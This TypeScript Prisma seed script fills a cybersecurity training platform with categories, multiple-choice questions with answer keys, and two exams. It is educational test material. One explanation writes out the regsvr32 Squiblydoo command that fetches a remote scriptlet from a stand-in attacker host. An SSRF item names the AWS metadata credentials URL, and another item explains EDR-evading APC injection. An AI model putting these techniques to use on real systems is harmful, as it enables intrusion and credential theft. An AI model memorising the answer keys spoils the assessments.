import { PrismaClient } from '@prisma/client';
import { DifficultyLevel, QuestionBankStatus, AssessmentStatus } from '@/types/assessment';

const prisma: any = new PrismaClient();

export async function seedAssessments() {
  console.log('🛡️  Seeding Cybersecurity Assessment Categories & Question Bank...');

  // 1. Initial 8 Configurable Categories
  const categoriesData = [
    { name: 'Red Teaming', slug: 'red-teaming', description: 'Offensive cyber operations, evasion techniques, adversary emulation, and post-exploitation.' },
    { name: 'Blue Teaming', slug: 'blue-teaming', description: 'Defensive architecture, digital forensics, threat hunting, telemetry analysis, and incident triage.' },
    { name: 'VAPT', slug: 'vapt', description: 'Vulnerability Assessment and Penetration Testing across network protocols, binaries, and infrastructures.' },
    { name: 'Web Security', slug: 'web-security', description: 'OWASP Top 10 vulnerabilities, HTTP semantics, modern client-side attacks, and API exploitation.' },
    { name: 'Bug Bounty', slug: 'bug-bounty', description: 'Reconnaissance, attack surface mapping, business logic flaws, and responsible disclosure.' },
    { name: 'Cloud Security', slug: 'cloud-security', description: 'AWS/GCP/Azure IAM policies, container breakouts, cloud misconfigurations, and zero trust architecture.' },
    { name: 'SOC', slug: 'soc', description: 'Security Operations Center workflows, SIEM rule construction, log parsing, and MTTD/MTTR optimization.' },
    { name: 'DevSecOps', slug: 'devsecops', description: 'Automated CI/CD security gating, SAST/DAST/SCA tooling, secret scanning, and infrastructure as code auditing.' },
  ];

  const categoryMap = new Map<string, string>();
  for (const cat of categoriesData) {
    const record = await prisma.testCategory.upsert({
      where: { slug: cat.slug },
      update: { name: cat.name, description: cat.description, isActive: true },
      create: { name: cat.name, slug: cat.slug, description: cat.description, isActive: true },
    });
    categoryMap.set(cat.slug, record.id);
  }
  console.log(`✅ Seeded ${categoryMap.size} Assessment Categories.`);

  // 2. Question Families (Concepts testing variants)
  const familiesData = [
    { code: 'AUTH-001', name: 'Authentication Protocol Protection', topic: 'Authentication & MFA', description: 'Core protocols and multi-factor defense mechanisms against credential stuffing.' },
    { code: 'SQLI-001', name: 'SQL Injection Remediation', topic: 'Database Security', description: 'Techniques to neutralize SQL Injection vulnerabilities using parameterized statements.' },
    { code: 'XSS-001', name: 'Cross-Site Scripting (XSS) Defenses', topic: 'Web Security', description: 'Client-side sanitization, Content Security Policy, and context-aware escaping.' },
    { code: 'IAM-001', name: 'Cloud Least Privilege & IAM', topic: 'Cloud Governance', description: 'Enforcing strict role-based access control and principle of least privilege in cloud environments.' },
    { code: 'SOC-001', name: 'Incident Response Lifecycle', topic: 'SOC Operations', description: 'Standard NIST SP 800-61 / SANS incident handling and containment frameworks.' },
    { code: 'NET-001', name: 'Network Packet Analysis & Ports', topic: 'Network Defense', description: 'TCP/IP handshake anomalies and common security protocol ports.' },
    { code: 'RED-001', name: 'Living off the Land (LotL)', topic: 'Adversary Tactics', description: 'Techniques utilizing built-in binaries (LOLBins) to evade antivirus signatures.' },
    { code: 'DEV-001', name: 'CI/CD Pipeline Artifact Hardening', topic: 'DevSecOps', description: 'Securing pipeline build artifacts and provenance verification (SLSA).' },
  ];

  const familyMap = new Map<string, string>();
  for (const fam of familiesData) {
    const record = await prisma.questionFamily.upsert({
      where: { code: fam.code },
      update: { name: fam.name, topic: fam.topic, description: fam.description },
      create: { code: fam.code, name: fam.name, topic: fam.topic, description: fam.description },
    });
    familyMap.set(fam.code, record.id);
  }
  console.log(`✅ Seeded ${familyMap.size} Question Families.`);

  // Find sample course to link
  const sampleCourse = await prisma.course.findFirst({
    where: { slug: 'web-application-security-vapt' },
  }) || await prisma.course.findFirst();

  if (!sampleCourse) {
    console.warn('⚠️ No existing course found. Please run main prisma:seed first.');
    return;
  }

  // 3. Question Bank - Questions across Categories and Difficulties
  interface QuestionSeedInput {
    familyCode?: string;
    categorySlug: string;
    topic: string;
    learningObjective?: string;
    difficulty: DifficultyLevel;
    marks: number;
    questionText: string;
    explanation: string;
    options: { text: string; isCorrect: boolean }[];
  }

  const questions: QuestionSeedInput[] = [
    // Web Security - Easy
    {
      familyCode: 'AUTH-001',
      categorySlug: 'web-security',
      topic: 'Authentication & MFA',
      learningObjective: 'Identify baseline multi-factor authentication requirements.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'Which security mechanism significantly reduces the risk of credential stuffing attacks by requiring a second verification factor?',
      explanation: 'Multi-Factor Authentication (MFA) requires users to provide two or more verification factors to gain access, rendering stolen passwords insufficient on their own.',
      options: [
        { text: 'Multi-Factor Authentication (MFA)', isCorrect: true },
        { text: 'Single Sign-On (SSO) with plain HTTP', isCorrect: false },
        { text: 'Basic HTTP Authentication', isCorrect: false },
        { text: 'Client-side cookie hashing', isCorrect: false },
      ],
    },
    // Variant 2 for AUTH-001
    {
      familyCode: 'AUTH-001',
      categorySlug: 'web-security',
      topic: 'Authentication & MFA',
      learningObjective: 'Understand out-of-band and possession verification.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'When mitigating unauthorized account takeover from credential leaks, which control enforces possession or inherence factors alongside knowledge factors?',
      explanation: 'Two-Factor / Multi-Factor Authentication forces proof of what you have (token/device) or what you are (biometrics) in addition to what you know (password).',
      options: [
        { text: 'Two-Factor / Multi-Factor Authentication (2FA/MFA)', isCorrect: true },
        { text: 'Extended password length with no expiration', isCorrect: false },
        { text: 'IP address binding without encryption', isCorrect: false },
        { text: 'User-Agent header validation', isCorrect: false },
      ],
    },
    // Web Security - Medium (SQLI-001 Variant 1)
    {
      familyCode: 'SQLI-001',
      categorySlug: 'web-security',
      topic: 'Database Security',
      learningObjective: 'Apply parameterized queries to prevent SQL Injection.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'What is the primary architectural defense against SQL Injection vulnerabilities in backend database queries?',
      explanation: 'Prepared statements (parameterized queries) ensure the database treats user input strictly as literal values rather than executable code.',
      options: [
        { text: 'Using Prepared Statements with Parameterized Queries', isCorrect: true },
        { text: 'Filtering user input with client-side JavaScript regex', isCorrect: false },
        { text: 'Base64 encoding all query parameters before string concatenation', isCorrect: false },
        { text: 'Running the database server on non-standard ports', isCorrect: false },
      ],
    },
    // Web Security - Medium (SQLI-001 Variant 2)
    {
      familyCode: 'SQLI-001',
      categorySlug: 'web-security',
      topic: 'Database Security',
      learningObjective: 'Differentiate SQL sanitization from query parameterization.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'Why are parameterized queries (Prepared Statements) more reliable than simple blacklisting or keyword filtering to defeat SQL Injection?',
      explanation: 'Parameterization separates code from data at the database parser level, making syntax manipulation structurally impossible regardless of input content.',
      options: [
        { text: 'They separate query logic from supplied data at the database parser level', isCorrect: true },
        { text: 'They automatically encrypt all database columns at rest', isCorrect: false },
        { text: 'They prevent SQL queries from returning more than one result record', isCorrect: false },
        { text: 'They block unauthorized TCP connections to port 3306', isCorrect: false },
      ],
    },
    // Web Security - Hard (XSS-001)
    {
      familyCode: 'XSS-001',
      categorySlug: 'web-security',
      topic: 'Browser Security Headers',
      learningObjective: 'Implement modern Content Security Policy (CSP) directives.',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'Which Content Security Policy (CSP) directive and mechanism provides the most robust mitigation against inline Stored Cross-Site Scripting (XSS)?',
      explanation: "Using script-src 'nonce-<random-base64>' or cryptographic hashes ensures only scripts generated and signed by the trusted server can execute in the DOM.",
      options: [
        { text: "script-src 'nonce-<random-token>' or cryptographic hash validation", isCorrect: true },
        { text: "script-src 'unsafe-inline' with X-XSS-Protection: 1", isCorrect: false },
        { text: "default-src 'self' with wildcard domain whitelists", isCorrect: false },
        { text: 'Setting Cache-Control: no-store on all HTTP responses', isCorrect: false },
      ],
    },
    // VAPT - Easy
    {
      categorySlug: 'vapt',
      topic: 'Reconnaissance & Port Scanning',
      learningObjective: 'Understand TCP SYN stealth scan mechanisms.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'In Nmap network scanning, what flag is used to initiate a TCP SYN Stealth scan that does not complete the 3-way handshake?',
      explanation: 'The -sS flag instructs Nmap to send a SYN packet and wait for a SYN/ACK or RST, tearing down the connection without completing the 3-way handshake.',
      options: [
        { text: '-sS', isCorrect: true },
        { text: '-sT', isCorrect: false },
        { text: '-sU', isCorrect: false },
        { text: '-sA', isCorrect: false },
      ],
    },
    // VAPT - Medium
    {
      categorySlug: 'vapt',
      topic: 'Vulnerability Analysis',
      learningObjective: 'Analyze Server-Side Request Forgery (SSRF) impact in cloud environments.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'During a penetration test against a cloud-hosted web application, which endpoint is commonly queried via SSRF to extract instance IAM credentials in AWS EC2?',
      explanation: 'The Instance Metadata Service (IMDSv1) IP is 169.254.169.254, hosting IAM security credentials under /latest/meta-data/iam/security-credentials/.',
      options: [
        { text: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', isCorrect: true },
        { text: 'http://127.0.0.1:8080/admin/credentials.json', isCorrect: false },
        { text: 'http://10.0.0.1/aws/iam/token', isCorrect: false },
        { text: 'http://metadata.google.internal/computeMetadata/v1/iam', isCorrect: false },
      ],
    },
    // VAPT - Hard
    {
      categorySlug: 'vapt',
      topic: 'Binary Exploitation & Buffer Overflows',
      learningObjective: 'Recognize ASLR and DEP/NX memory protections.',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'When modern binary targets have No-Execute (NX/DEP) enabled, which exploit technique chains existing executable instructions ending in RET to achieve code execution?',
      explanation: 'Return-Oriented Programming (ROP) chains small snippets of executable code ending in RET (ROP gadgets) to bypass non-executable stack/heap memory protections.',
      options: [
        { text: 'Return-Oriented Programming (ROP)', isCorrect: true },
        { text: 'NOP Sled Shellcode Injection', isCorrect: false },
        { text: 'Format String Memory Write (%n)', isCorrect: false },
        { text: 'Integer Underflow to Stack Pointer Override', isCorrect: false },
      ],
    },
    // Red Teaming - Easy
    {
      categorySlug: 'red-teaming',
      topic: 'Adversary Frameworks',
      learningObjective: 'Identify the MITRE ATT&CK matrix purpose.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'Which globally accessible knowledge base provides a curated taxonomy of adversary tactics, techniques, and procedures (TTPs) based on real-world observations?',
      explanation: 'The MITRE ATT&CK framework categorizes post-compromise adversary tactics and techniques used by threat actors globally.',
      options: [
        { text: 'MITRE ATT&CK Framework', isCorrect: true },
        { text: 'OWASP Top 10', isCorrect: false },
        { text: 'NIST Cyber Security Framework (CSF)', isCorrect: false },
        { text: 'CIS Benchmarks v8', isCorrect: false },
      ],
    },
    // Red Teaming - Medium (RED-001 Variant 1)
    {
      familyCode: 'RED-001',
      categorySlug: 'red-teaming',
      topic: 'Living off the Land (LOLBins)',
      learningObjective: 'Identify Windows native binaries used for defense evasion.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'Which Microsoft signed binary is frequently leveraged by threat actors as a LOLBin to execute arbitrary remote scriptlets (.sct) via proxy execution?',
      explanation: 'regsvr32.exe can be leveraged using the /s /n /u /i:http://attacker/script.sct scrobj.dll syntax to bypass AppLocker rules (Squiblydoo technique).',
      options: [
        { text: 'regsvr32.exe', isCorrect: true },
        { text: 'calc.exe', isCorrect: false },
        { text: 'notepad.exe', isCorrect: false },
        { text: 'tasklist.exe', isCorrect: false },
      ],
    },
    // Red Teaming - Hard
    {
      categorySlug: 'red-teaming',
      topic: 'Process Injection & Evasion',
      learningObjective: 'Analyze Early Bird APC Injection.',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'What advantage does Early Bird APC Injection offer to an adversary seeking to bypass behavioral Endpoint Detection and Response (EDR) hooks?',
      explanation: 'Early Bird queues an Asynchronous Procedure Call (APC) to a newly created suspended process thread before the main entry point runs, executing malicious payload before EDR DLL hooks are initialized.',
      options: [
        { text: 'It executes shellcode in a suspended process before third-party EDR monitoring DLLs hook the process', isCorrect: true },
        { text: 'It completely disables Windows Kernel Patch Protection (PatchGuard)', isCorrect: false },
        { text: 'It runs shellcode at Ring 0 kernel privilege level without a driver', isCorrect: false },
        { text: 'It converts unmanaged C++ into managed .NET code in memory', isCorrect: false },
      ],
    },
    // Blue Teaming - Easy
    {
      categorySlug: 'blue-teaming',
      topic: 'Digital Forensics & Artifacts',
      learningObjective: 'Identify Windows Event Log IDs for process creation.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'In Windows Security Event Logs, which Event ID explicitly tracks the creation of a new process (when Audit Process Creation is enabled)?',
      explanation: 'Windows Security Event ID 4688 logs when a new process is created, providing Process Name, Creator Process ID, and command line arguments if configured.',
      options: [
        { text: 'Event ID 4688', isCorrect: true },
        { text: 'Event ID 4624', isCorrect: false },
        { text: 'Event ID 1102', isCorrect: false },
        { text: 'Event ID 7045', isCorrect: false },
      ],
    },
    // Blue Teaming - Medium
    {
      categorySlug: 'blue-teaming',
      topic: 'Threat Hunting',
      learningObjective: 'Understand Kerberoasting detection signatures.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'When monitoring Active Directory for Kerberoasting activity, defenders should alert on an anomalous volume of which Kerberos request ticket type requesting RC4 encryption?',
      explanation: 'Event ID 4769 (A Kerberos service ticket was requested) requesting cipher 0x17 (RC4-HMAC) for user accounts with Service Principal Names (SPNs) indicates Kerberoasting.',
      options: [
        { text: 'TGS-REQ (Kerberos Ticket Granting Service Request) with RC4 encryption', isCorrect: true },
        { text: 'AS-REQ with AES-256 pre-authentication only', isCorrect: false },
        { text: 'DHCP Discover broadcasts from Domain Controllers', isCorrect: false },
        { text: 'DNS PTR record queries for loopback interfaces', isCorrect: false },
      ],
    },
    // Blue Teaming - Hard
    {
      categorySlug: 'blue-teaming',
      topic: 'Kernel & Memory Forensics',
      learningObjective: 'Detect Direct Kernel Object Modification (DKOM).',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'In volatile memory analysis using Volatility 3, which plugin detects hidden processes that unlinked themselves from the ActiveProcessLinks doubly-linked list (DKOM)?',
      explanation: 'psscan scans memory for pool allocations of EPROCESS structures, discovering processes unlinked from ActiveProcessLinks (which pslist walks).',
      options: [
        { text: 'windows.psscan', isCorrect: true },
        { text: 'windows.pslist', isCorrect: false },
        { text: 'windows.cmdline', isCorrect: false },
        { text: 'windows.netstat', isCorrect: false },
      ],
    },
    // Cloud Security - Easy (IAM-001 Variant 1)
    {
      familyCode: 'IAM-001',
      categorySlug: 'cloud-security',
      topic: 'Cloud Governance & IAM',
      learningObjective: 'Apply the Principle of Least Privilege in cloud environments.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'What fundamental security rule states that a cloud user or service should only be granted the minimum permissions necessary to perform their assigned task?',
      explanation: 'The Principle of Least Privilege (PoLP) minimizes blast radius by granting only the essential permissions required for designated operations.',
      options: [
        { text: 'Principle of Least Privilege (PoLP)', isCorrect: true },
        { text: 'Separation of Environments Principle', isCorrect: false },
        { text: 'Defense-in-Breadth Paradigm', isCorrect: false },
        { text: 'Zero-Maintenance Privilege Model', isCorrect: false },
      ],
    },
    // Cloud Security - Medium
    {
      categorySlug: 'cloud-security',
      topic: 'S3 & Storage Security',
      learningObjective: 'Differentiate S3 bucket ACLs from Bucket Policies.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'Which AWS control provides account-level protection to guarantee that no Amazon S3 bucket within an AWS account can be accidentally exposed to the public internet?',
      explanation: 'S3 Block Public Access (at the account level) overrides all bucket policies and ACLs to ensure public read/write access is blocked globally.',
      options: [
        { text: 'S3 Block Public Access (Account Level)', isCorrect: true },
        { text: 'AWS Shield Standard', isCorrect: false },
        { text: 'CloudWatch Metrics Alarms', isCorrect: false },
        { text: 'VPC Peering Connection Filter', isCorrect: false },
      ],
    },
    // Cloud Security - Hard
    {
      categorySlug: 'cloud-security',
      topic: 'Container Security & Kubernetes',
      learningObjective: 'Analyze Kubernetes Admission Controllers.',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'In a production Kubernetes cluster, which mechanism validates and mutates Pod specifications at API admission time to prevent pods from running as root or with hostPID?',
      explanation: 'Validating and Mutating Admission Webhooks (such as OPA Gatekeeper or Kyverno) intercept API requests before objects are persisted into etcd to enforce cluster security policies.',
      options: [
        { text: 'Admission Controllers (e.g. Validating Webhooks with OPA Gatekeeper)', isCorrect: true },
        { text: 'Kube-proxy IPVS table rules', isCorrect: false },
        { text: 'CoreDNS SRV records', isCorrect: false },
        { text: 'Containerd CNI bridge plugins', isCorrect: false },
      ],
    },
    // SOC - Easy (SOC-001 Variant 1)
    {
      familyCode: 'SOC-001',
      categorySlug: 'soc',
      topic: 'Incident Handling',
      learningObjective: 'Identify the six phases of the NIST Incident Response lifecycle.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'According to the NIST SP 800-61 incident response lifecycle, what is the initial phase that involves tools, policies, and training before an incident occurs?',
      explanation: 'Preparation is the initial phase focused on preventive measures, instrumentation, playbooks, and readiness training before an actual security event.',
      options: [
        { text: 'Preparation', isCorrect: true },
        { text: 'Detection & Analysis', isCorrect: false },
        { text: 'Containment, Eradication & Recovery', isCorrect: false },
        { text: 'Post-Incident Activity', isCorrect: false },
      ],
    },
    // SOC - Medium
    {
      categorySlug: 'soc',
      topic: 'SIEM & Detection Engineering',
      learningObjective: 'Evaluate Sigma and YARA-L rules for threat detection.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'What is the open-source, generic signature format that allows detection engineers to write log detection rules once and convert them to Splunk, Elastic, or Microsoft Sentinel?',
      explanation: 'Sigma is a generic and open signature format for describing log events in a vendor-agnostic manner, transpilable to diverse SIEM query languages.',
      options: [
        { text: 'Sigma Rules', isCorrect: true },
        { text: 'Snort Rules', isCorrect: false },
        { text: 'YARA Rules', isCorrect: false },
        { text: 'STIX 2.1 Objects', isCorrect: false },
      ],
    },
    // SOC - Hard
    {
      categorySlug: 'soc',
      topic: 'Threat Intelligence & Correlation',
      learningObjective: 'Calculate Mean Time to Detect (MTTD) and Respond (MTTR).',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'In SOC operational maturity modeling, what metric measures the elapsed time from when an attacker first compromises an environment until security analysts identify the compromise?',
      explanation: 'Mean Time to Detect (MTTD) measures the latency between initial adversary penetration or execution and the detection alert confirmation by SOC analysts.',
      options: [
        { text: 'Mean Time to Detect (MTTD) / Dwell Time', isCorrect: true },
        { text: 'Mean Time to Recovery (MTTR)', isCorrect: false },
        { text: 'Mean Time Between Failures (MTBF)', isCorrect: false },
        { text: 'False Positive Ratio (FPR)', isCorrect: false },
      ],
    },
    // DevSecOps - Easy
    {
      categorySlug: 'devsecops',
      topic: 'Application Security Testing',
      learningObjective: 'Distinguish SAST from DAST.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'Which security testing methodology analyzes source code, byte code, or application binaries for vulnerabilities without executing the application?',
      explanation: 'Static Application Security Testing (SAST) is a white-box testing methodology analyzing static code files without running the system.',
      options: [
        { text: 'Static Application Security Testing (SAST)', isCorrect: true },
        { text: 'Dynamic Application Security Testing (DAST)', isCorrect: false },
        { text: 'Interactive Application Security Testing (IAST)', isCorrect: false },
        { text: 'Penetration Testing via Burp Suite', isCorrect: false },
      ],
    },
    // DevSecOps - Medium (DEV-001 Variant 1)
    {
      familyCode: 'DEV-001',
      categorySlug: 'devsecops',
      topic: 'Supply Chain Security',
      learningObjective: 'Inspect Software Bill of Materials (SBOM).',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'What standardized machine-readable inventory format (e.g. CycloneDX or SPDX) details all third-party software components and dependencies used in a software build?',
      explanation: 'A Software Bill of Materials (SBOM) details an inventory of ingredients, dependencies, libraries, and licenses comprising a software artifact.',
      options: [
        { text: 'Software Bill of Materials (SBOM)', isCorrect: true },
        { text: 'Dockerfile Manifest V2', isCorrect: false },
        { text: 'Git Commit Tree Signature', isCorrect: false },
        { text: 'GPG Keyring Export', isCorrect: false },
      ],
    },
    // DevSecOps - Hard
    {
      categorySlug: 'devsecops',
      topic: 'Supply Chain Security & SLSA',
      learningObjective: 'Evaluate Supply-chain Levels for Software Artifacts (SLSA).',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'Under the Supply-chain Levels for Software Artifacts (SLSA) framework, what cryptographic artifact ensures that a binary was built on a trusted, isolated build service from a specific Git commit?',
      explanation: 'Cryptographically signed build provenance (e.g. using Sigstore/Cosign and in-toto attestations) guarantees that artifacts were produced by verifiable build pipelines.',
      options: [
        { text: 'Cryptographically signed Build Provenance (Attestation)', isCorrect: true },
        { text: 'Pre-commit hook linting report', isCorrect: false },
        { text: 'Encrypted zip bundle password', isCorrect: false },
        { text: 'Self-signed TLS server certificate', isCorrect: false },
      ],
    },
    // Bug Bounty - Easy
    {
      categorySlug: 'bug-bounty',
      topic: 'Reconnaissance',
      learningObjective: 'Enumerate subdomains using Certificate Transparency.',
      difficulty: DifficultyLevel.EASY,
      marks: 1.0,
      questionText: 'Which publicly queryable public log system is widely utilized by security researchers during passive reconnaissance to discover newly registered subdomains via TLS certificates?',
      explanation: 'Certificate Transparency (CT) logs (e.g., crt.sh) record all issued TLS certificates publicly, providing an exhaustive passive source for subdomain discovery.',
      options: [
        { text: 'Certificate Transparency (CT) Logs (crt.sh)', isCorrect: true },
        { text: 'WHOIS registrant email privacy service', isCorrect: false },
        { text: 'Local hosts file (/etc/hosts)', isCorrect: false },
        { text: 'BGP Looking Glass servers', isCorrect: false },
      ],
    },
    // Bug Bounty - Medium
    {
      categorySlug: 'bug-bounty',
      topic: 'Subdomain Takeover',
      learningObjective: 'Identify dangling DNS CNAME records.',
      difficulty: DifficultyLevel.MEDIUM,
      marks: 2.0,
      questionText: 'A Subdomain Takeover vulnerability primarily arises when which DNS record points to a decommissioned or unallocated third-party cloud service (e.g., GitHub Pages, AWS S3)?',
      explanation: 'A dangling CNAME record points to an external third-party domain that has been abandoned or deleted, allowing an attacker to claim that resource and serve malicious content.',
      options: [
        { text: 'Dangling CNAME record pointing to an unclaimed third-party provider', isCorrect: true },
        { text: 'MX record pointing to an active Google Workspace account', isCorrect: false },
        { text: 'TXT record containing an SPF verification string', isCorrect: false },
        { text: 'PTR reverse lookup record for a public DNS resolver', isCorrect: false },
      ],
    },
    // Bug Bounty - Hard
    {
      categorySlug: 'bug-bounty',
      topic: 'OAuth & OpenID Connect Flaws',
      learningObjective: 'Prevent OAuth authorization code interception and CSRF.',
      difficulty: DifficultyLevel.HARD,
      marks: 3.0,
      questionText: 'In OAuth 2.0 implementations, which security parameter in the authorization request binds the authorization session to the client state to prevent OAuth Login CSRF?',
      explanation: 'The state parameter contains an unguessable cryptographic token that the client checks upon redirection to protect against CSRF attacks.',
      options: [
        { text: 'The state parameter containing an unpredictable cryptographic token', isCorrect: true },
        { text: 'The response_type=code parameter', isCorrect: false },
        { text: 'The scope=openid parameter', isCorrect: false },
        { text: 'The redirect_uri query string without HTTPS', isCorrect: false },
      ],
    },
  ];

  let insertedCount = 0;
  for (const q of questions) {
    const categoryId = categoryMap.get(q.categorySlug);
    if (!categoryId) continue;

    const familyId = q.familyCode ? familyMap.get(q.familyCode) || null : null;

    // Check if question already exists
    const existing = await prisma.bankQuestion.findFirst({
      where: { questionText: q.questionText },
    });

    if (!existing) {
      await prisma.bankQuestion.create({
        data: {
          questionFamilyId: familyId,
          courseId: sampleCourse.id,
          categoryId: categoryId,
          topic: q.topic,
          learningObjective: q.learningObjective,
          difficulty: q.difficulty,
          questionType: 'MCQ',
          marks: q.marks,
          questionText: q.questionText,
          explanation: q.explanation,
          status: QuestionBankStatus.ACTIVE,
          options: {
            create: q.options.map((opt, idx) => ({
              optionText: opt.text,
              isCorrect: opt.isCorrect,
              orderIndex: idx,
            })),
          },
        },
      });
      insertedCount++;
    }
  }
  console.log(`✅ Seeded ${insertedCount} questions into Question Bank.`);

  // 4. Create Two Official Published Assessments with Real Blueprints
  const vaptCatId = categoryMap.get('vapt')!;
  const webSecCatId = categoryMap.get('web-security')!;
  const cloudCatId = categoryMap.get('cloud-security')!;
  const redTeamCatId = categoryMap.get('red-teaming')!;
  const blueTeamCatId = categoryMap.get('blue-teaming')!;

  const existingExam = await prisma.assessment.findFirst({
    where: { title: 'Cyber Security Professional Qualification Exam' },
  });

  if (!existingExam) {
    const categoryDistribution = [
      { categoryId: webSecCatId, percentage: 30 },
      { categoryId: vaptCatId, percentage: 25 },
      { categoryId: redTeamCatId, percentage: 15 },
      { categoryId: blueTeamCatId, percentage: 15 },
      { categoryId: cloudCatId, percentage: 15 },
    ];

    await prisma.assessment.create({
      data: {
        courseId: sampleCourse.id,
        categoryId: webSecCatId,
        title: 'Cyber Security Professional Qualification Exam',
        slug: 'cyber-security-qualification-exam',
        description: 'Comprehensive timed qualification exam assessing real-world vulnerability analysis, web defense, adversary tactics, and cloud security architecture.',
        instructions: '• Read every question carefully before selecting an answer.\n• Answers are saved automatically with each selection.\n• The test will automatically submit when the countdown expires.\n• Full-screen and active browser focus are monitored.\n• Do not close or refresh your browser unnecessarily.',
        durationMinutes: 30,
        totalMarks: 20.0,
        passingScore: 70.0,
        questionsPerAttempt: 10,
        maxAttempts: 3,
        status: AssessmentStatus.PUBLISHED,

        // Randomization & Anti-cheating
        randomQuestionSelection: true,
        randomQuestionOrder: true,
        randomOptionOrder: true,
        difficultyBalancing: true,
        categoryBalancing: true,
        questionVariants: true,
        preventDuplicateFamilies: true,
        autoSave: true,
        autoSubmit: true,
        fullScreen: true,
        tabSwitchDetection: true,
        copyPasteRestriction: true,
        rightClickRestriction: true,

        // Blueprint distributions
        easyPercent: 40.0,
        mediumPercent: 40.0,
        hardPercent: 20.0,
        categoryDistributionJson: JSON.stringify(categoryDistribution),
      },
    });
    console.log('✅ Created "Cyber Security Professional Qualification Exam" with live blueprint.');
  }

  const existingWebExam = await prisma.assessment.findFirst({
    where: { title: 'Web Application Security & OWASP Assessment' },
  });

  if (!existingWebExam) {
    const webCategoryDistribution = [
      { categoryId: webSecCatId, percentage: 60 },
      { categoryId: vaptCatId, percentage: 40 },
    ];

    await prisma.assessment.create({
      data: {
        courseId: sampleCourse.id,
        categoryId: webSecCatId,
        title: 'Web Application Security & OWASP Assessment',
        slug: 'web-app-security-owasp-assessment',
        description: 'Targeted assessment evaluating proficiency in OWASP Top 10 vulnerabilities, secure coding, input validation, and proxy exploitation.',
        instructions: '• Select the single most accurate option for each question.\n• Progress is synced in real-time with the server.\n• Timer is strictly authoritative on the server side.\n• Multiple attempts will receive uniquely generated question variants.',
        durationMinutes: 20,
        totalMarks: 15.0,
        passingScore: 75.0,
        questionsPerAttempt: 5,
        maxAttempts: 2,
        status: AssessmentStatus.PUBLISHED,

        randomQuestionSelection: true,
        randomQuestionOrder: true,
        randomOptionOrder: true,
        difficultyBalancing: true,
        categoryBalancing: true,
        questionVariants: true,
        preventDuplicateFamilies: true,
        autoSave: true,
        autoSubmit: true,
        fullScreen: false,
        tabSwitchDetection: true,
        copyPasteRestriction: true,
        rightClickRestriction: true,

        easyPercent: 40.0,
        mediumPercent: 40.0,
        hardPercent: 20.0,
        categoryDistributionJson: JSON.stringify(webCategoryDistribution),
      },
    });
    console.log('✅ Created "Web Application Security & OWASP Assessment".');
  }

  console.log('🎉 Assessment system seed completed successfully!');
}

if (process.argv[1]?.includes('seed-assessments')) {
  seedAssessments()
    .catch((err) => {
      console.error('Error seeding assessments:', err);
      process.exit(1);
    })
    .finally(async () => {
      await prisma.$disconnect();
    });
}
